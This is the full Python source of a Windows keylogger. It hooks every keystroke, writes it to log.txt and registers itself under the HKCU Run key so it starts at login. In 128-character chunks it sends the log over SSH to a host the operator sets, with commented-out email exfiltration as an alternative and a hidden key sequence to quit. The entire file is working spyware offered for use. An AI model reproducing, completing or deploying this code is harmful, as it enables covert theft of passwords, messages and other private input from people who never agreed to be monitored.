import pyHook
import pythoncom
import sys
import os

import win32event
import win32api
import winerror
import base64

from _winreg import *  # For registry
from checkURL import checkURL  # To check internet connectivity

#from myEmail import *

from Tkinter import *  # For GUI

from keyloggerClient import *  # Contains the ssh and sftp functions used to send back log.txt to the server

data = ''  # To hold logged key
exitStack = []
hostAddress = '<Your host IP>'

# Disallow multiple instances. source: ajinabraham/Xenotix-Python-Keylogger
mutex = win32event.CreateMutex(None, 1, 'mutex_var_xboz')
if win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:
    mutex = None
    print "Multiple Instance not Allowed"
    sys.exit(0)


def addToStartup():
    dirPath = os.getcwd()
    progName = sys.argv[0].split("\\")[-1]
    dirPath = dirPath + '\\' + progName
    keyValue = r'Software\Microsoft\Windows\CurrentVersion\Run'

    currentKey = OpenKey(HKEY_CURRENT_USER, keyValue, 0, KEY_ALL_ACCESS)
    SetValueEx(currentKey, "keylogger", 0, REG_SZ, dirPath)


class Application(Frame):  # Class for implementation of exitGui
    def CreateWidgets(self):
        self.QUIT = Button(self)
        self.QUIT["text"] = "QUIT"
        self.QUIT["fg"] = "red"
        self.QUIT["command"] = self.quit

        self.QUIT.pack({"side": "left"})

    def __init__(self, master=None):
        Frame.__init__(self, master)
        self.pack()
        self.CreateWidgets()


def checkInternet():  # To check if client is connected to the internet
    return checkURL()


def checkHost(url):  # To check if host is reachable from the client
    return checkURL(url=url)


def OnKeyBoardEvent(event):
    global data
    global exitStack
    global keyLength
    # logging.basicConfig(filename=file_log, level=logging.DEBUG, format='%(message)s')
    # logging.log(10,chr(event.Ascii))

    if event.Ascii == 8:  # Exit on backspace
        key = '<BACKSPACE>'
    elif event.Ascii == 13:  # Carraige return representation
        key = '<ENTER>'
    elif event.Ascii == 9:  # TAB Representation
        key = '<TAB>'
    else:
        key = chr(event.Ascii)

    data += key

    if event.Ascii == 8:
        exitStack.append(event.Ascii)
    elif event.Ascii == 0:
        exitStack.append(event.Ascii)
    else:
        exitStack = []

    if len(exitStack) == 4:
        if exitStack[0] == 8 and exitStack[1] == 0 and exitStack[2] == 8 and exitStack[3] == 0:  # If last four values
            app.mainloop()                                                                       # entered were <back><del><back><del>
            root.destroy()                                                                       # spawn a quit dialog box
            mySSH.sshKill()
            #myEmail.killConnection()
            sys.exit(1)
        else:
            exitStack = []

    if len(data) == 128:  # Write data in chunks of 128 bytes
        writeLogs()
        if mySSH.checkAlive():
            print mySSH.sendFile()
        else:
            print 'No SSH connection to host. Trying to initiate a new connection'
            if checkInternet() and checkHost(url='http://'+hostAddress):  # Initiate ssh connection if internet is available and host is up
                if mySSH.initiateConnection():
                    print 'New SSH connection initialized'
                    print mySSH.sendFile()
                else:
                    print 'Internet available and host is up but unable to initiate SSH connection. No means of sending file to host'
            else:
                'Internet unavailable or host unreachable'
        #myEmail.sendEmail()
        data=''
    return True


def writeLogs(name='log.txt'):
    global data
    try:
        f = open(name, 'a')
        f.write(data)
        f.close()
    except Exception, e:
        print(str(e))
    return

#myEmail = MyEmail()
#myEmail.prepareMessage()
#myEmail.initiateConnection()
addToStartup()
mySSH = ssh()
if checkInternet() and checkHost(url='http://'+hostAddress):  # Initiate ssh connection if internet is available and host is up
    if mySSH.initiateConnection():
        print 'Initial SSH connection initiated'
    else:
        print 'Initial SSH connection could not be initiated'

root = Tk()                              # Tk Object
app = Application(root)                  # Passing Tk object to our GUI implementation class
hooks_manager = pyHook.HookManager()     # Create a hook
hooks_manager.KeyDown = OnKeyBoardEvent  # Assign keydown event handler
hooks_manager.HookKeyboard()             # assign hook to the keyboard
pythoncom.PumpMessages()             